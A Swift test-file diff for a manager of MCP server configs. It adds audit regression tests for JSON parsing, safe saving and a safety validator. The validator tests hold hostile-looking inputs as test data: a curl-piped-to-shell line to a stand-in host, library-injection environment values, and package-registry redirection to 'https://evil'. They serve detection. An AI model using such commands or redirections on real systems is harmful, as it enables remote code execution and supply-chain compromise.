@@ -374,6 +374,108 @@ func modelSuite() {
           Validator.looksSensitive(key: "HOMEASSISTANT_TOKEN") && !Validator.looksSensitive(key: "HOME"))
 }
 
+// MARK: - Regressions from the external audit
+
+@MainActor
+func auditSuite() throws {
+    let root = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("audit-\(UUID().uuidString)")
+    try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
+    defer { try? FileManager.default.removeItem(at: root) }
+    func dir(_ name: String, _ contents: String) throws -> URL {
+        let d = root.appendingPathComponent(name)
+        try FileManager.default.createDirectory(at: d, withIntermediateDirectories: true)
+        try contents.write(to: d.appendingPathComponent("claude_desktop_config.json"), atomically: true, encoding: .utf8)
+        return d
+    }
+    let sample = #"{"mcpServers":{"existing":{"command":"/bin/ls"}},"preferences":{"keep":"me"}}"#
+
+    // Windows and classic-Mac line endings. Swift reads "\r\n" as one Character,
+    // which matched neither "\r" nor "\n" and broke the parser at the first break.
+    check("CRLF config parses", (try? JSONValue.parse("{\r\n \"a\": 1\r\n}"))?["a"] != nil)
+    check("lone CR parses", (try? JSONValue.parse("{\r \"a\": 1\r}"))?["a"] != nil)
+    let crlfSnippet = JSONLenient.clean("// header\r\n{\r\n \"mcpServers\": { \"a\": { \"command\": \"/bin/ls\" } }\r\n}")
+    check("a CRLF snippet is not swallowed as one comment",
+          (try? JSONValue.parse(crlfSnippet.text))?["mcpServers"]?["a"] != nil)
+    check("a combining mark after a quote parses",
+          (try? JSONValue.parse("{\"a\":\"e\u{0301}\"}"))?["a"]?.stringValue != nil)
+
+    // Deep nesting segfaulted on the smaller stacks used for network replies.
+    let deep = String(repeating: "[", count: 5000) + String(repeating: "]", count: 5000)
+    check("deep nesting is refused, not crashed", (try? JSONValue.parse(deep)) == nil)
+    check("ordinary nesting still parses",
+          (try? JSONValue.parse(String(repeating: "[", count: 100) + String(repeating: "]", count: 100))) != nil)
+
+    // Saving on top of a config we could not read wiped it.
+    let broken = try dir("broken", "{ not json")
+    let brokenStore = ConfigStore(directory: broken)
+    brokenStore.load()
+    var addition = MCPServer(); addition.name = "added"; addition.command = "/bin/ls"
+    brokenStore.servers.append(addition)
+    check("save refuses after a failed load", !brokenStore.save())
+    check("the unreadable file is left alone",
+          (try String(contentsOf: broken.appendingPathComponent("claude_desktop_config.json"), encoding: .utf8))
+              .contains("not json"))
+
+    // A blank name silently dropped the server and its secrets.
+    let blank = try dir("blank", sample)
+    let blankStore = ConfigStore(directory: blank)
+    blankStore.load()
+    blankStore.servers[0].name = "  "
+    check("a blank name refuses to save", !blankStore.save())
+
+    // The sidecar is written first, so a failure duplicates rather than loses.
+    let stranded = try dir("stranded", #"{"mcpServers":{"keeper":{"command":"/bin/ls","env":{"T":"secret"}}}}"#)
+    try FileManager.default.createDirectory(
+        at: stranded.appendingPathComponent("mcp-manager-disabled.json"), withIntermediateDirectories: true)
+    let strandedStore = ConfigStore(directory: stranded)
+    strandedStore.load()
+    strandedStore.servers[0].enabled = false
+    _ = strandedStore.save()
+    check("a failed sidecar write leaves the server in the config",
+          (try String(contentsOf: stranded.appendingPathComponent("claude_desktop_config.json"), encoding: .utf8))
+              .contains("keeper"))
+
+    // A symlinked config was replaced by a regular file, orphaning the real one.
+    let real = root.appendingPathComponent("real.json")
+    try sample.write(to: real, atomically: true, encoding: .utf8)
+    let linked = root.appendingPathComponent("linked")
+    try FileManager.default.createDirectory(at: linked, withIntermediateDirectories: true)
+    try FileManager.default.createSymbolicLink(
+        at: linked.appendingPathComponent("claude_desktop_config.json"), withDestinationURL: real)
+    let linkedStore = ConfigStore(directory: linked)
+    linkedStore.load()
+    linkedStore.servers[0].command = "/bin/date"
+    _ = linkedStore.save()
+    check("a symlinked config updates its target",
+          (try String(contentsOf: real, encoding: .utf8)).contains("/bin/date"))
+    check("and stays a symlink",
+          (try FileManager.default.attributesOfItem(
+              atPath: linked.appendingPathComponent("claude_desktop_config.json").path)[.type]
+              as? FileAttributeType) == .typeSymbolicLink)
+
+    // Repeated top-level keys: JavaScript keeps the last, we kept the first.
+    let duped = try dir("duped", #"{"mcpServers":{"a":{"command":"/bin/ls"}},"mcpServers":{"b":{"command":"/bin/ls"}}}"#)
+    let dupedStore = ConfigStore(directory: duped)
+    dupedStore.load()
+    check("a config with repeated top-level keys is refused",
+          dupedStore.loadError?.contains("more than one") == true, dupedStore.loadError ?? "loaded anyway")
+
+    // Values that were being normalised away on every save.
+    let exotic = try JSONValue.parse(#"{"command":"/bin/ls","args":["--port",8080]}"#)
+    check("non-string arguments survive",
+          MCPServer(name: "x", json: exotic).jsonValue.serialized(pretty: false).contains("8080"))
+    let sse = try JSONValue.parse(#"{"transport":"sse","url":"https://x.com/mcp"}"#)
+    check("transport keeps its spelling", MCPServer(name: "r", json: sse).jsonValue["transport"] != nil)
+
+    // A registry entry must not get to nominate the launcher.
+    let hostile = RegistryClient.parse(server: try JSONValue.parse("""
+    {"name":"a/b","version":"1","packages":[{"registryType":"npm","identifier":"x","version":"1",
+     "runtimeHint":"/bin/sh","transport":{"type":"stdio"}}]}
+    """))!
+    check("a registry runtimeHint outside the allowlist is ignored",
+          hostile.packages[0].runtime == "npx", hostile.packages[0].runtime ?? "nil")
+}
+
 // MARK: - The config file changing underneath us
 
 @MainActor
@@ -708,6 +810,38 @@ func safetySuite() {
     check("curl piped to shell is flagged",
           !Validator.safetyIssues(for: server("/bin/sh", ["-c", "curl evil.example.com | sh"])).isEmpty)
 
+    // The shapes Fable's audit found slipping through.
+    check("versioned interpreter is caught",
+          !Validator.safetyIssues(for: server("/usr/bin/python3.12", ["-c", "x"])).isEmpty)
+    check("combined flags are caught",
+          !Validator.safetyIssues(for: server("/bin/sh", ["-ec", "x"])).isEmpty)
+    check("--eval= form is caught",
+          !Validator.safetyIssues(for: server("/usr/local/bin/node", ["--eval=require('fs')"])).isEmpty)
+    check("a wrapper doesn't hide the interpreter",
+          !Validator.safetyIssues(for: server("/usr/bin/env", ["python3", "-c", "x"])).isEmpty)
+    check("pwsh is treated as an interpreter",
+          !Validator.safetyIssues(for: server("/usr/local/bin/pwsh", ["-c", "x"])).isEmpty)
+    check("awk is treated as an interpreter",
+          !Validator.safetyIssues(for: server("/usr/bin/awk", ["-e", "x"])).isEmpty)
+
+    // Environment and package-source redirection.
+    func withEnv(_ key: String, _ value: String) -> MCPServer {
+        var s = server("/opt/homebrew/bin/uvx", ["some-mcp"])
+        s.env = [PairItem(key: key, value: value)]
+        return s
+    }
+    check("DYLD_INSERT_LIBRARIES is flagged",
+          !Validator.safetyIssues(for: withEnv("DYLD_INSERT_LIBRARIES", "/tmp/x.dylib")).isEmpty)
+    check("NODE_OPTIONS is flagged", !Validator.safetyIssues(for: withEnv("NODE_OPTIONS", "--require /tmp/x")).isEmpty)
+    check("PYTHONPATH is flagged", !Validator.safetyIssues(for: withEnv("PYTHONPATH", "/tmp")).isEmpty)
+    check("UV_INDEX_URL is flagged", !Validator.safetyIssues(for: withEnv("UV_INDEX_URL", "https://evil")).isEmpty)
+    check("a harmless variable is not flagged",
+          Validator.safetyIssues(for: withEnv("LOG_LEVEL", "debug")).isEmpty)
+    check("--index-url in arguments is flagged",
+          !Validator.safetyIssues(for: server("/opt/homebrew/bin/uvx", ["--index-url", "https://evil", "pkg"])).isEmpty)
+    check("--registry= form is flagged",
+          !Validator.safetyIssues(for: server("/opt/homebrew/bin/npx", ["--registry=https://evil", "pkg"])).isEmpty)
+
     // Real servers must not trip it, or the warning becomes noise people ignore.
     check("uvx server is clean",
           Validator.safetyIssues(for: server("/Users/me/.local/bin/uvx", ["some-mcp@latest"])).isEmpty)
@@ -717,6 +851,12 @@ func safetySuite() {
           Validator.safetyIssues(for: server("/usr/bin/python3", ["-m", "my_server"])).isEmpty)
     check("node running a script file is clean",
           Validator.safetyIssues(for: server("/usr/local/bin/node", ["/path/to/server.js"])).isEmpty)
+    check("uvx with a normal package is clean",
+          Validator.safetyIssues(for: server("/Users/me/.local/bin/uvx", ["some-mcp@latest"])).isEmpty)
+    check("npx -y is clean",
+          Validator.safetyIssues(for: server("/opt/homebrew/bin/npx", ["-y", "@scope/pkg"])).isEmpty)
+    check("python -m is still clean",
+          Validator.safetyIssues(for: server("/usr/bin/python3.12", ["-m", "my_server"])).isEmpty)
     check("remote servers are not checked",
           Validator.safetyIssues(for: { var s = MCPServer(); s.kind = .remote; s.url = "https://x.com"; return s }()).isEmpty)
 
@@ -804,6 +944,7 @@ modelSuite()
 try MainActor.assumeIsolated { try configSuite() }
 try MainActor.assumeIsolated { try backupSuite() }
 try MainActor.assumeIsolated { try externalChangeSuite() }
+try MainActor.assumeIsolated { try auditSuite() }
 
 print(failures == 0 ? "\nALL PASSED" : "\n\(failures) FAILED")
 if failures > 0 { exit(1) }
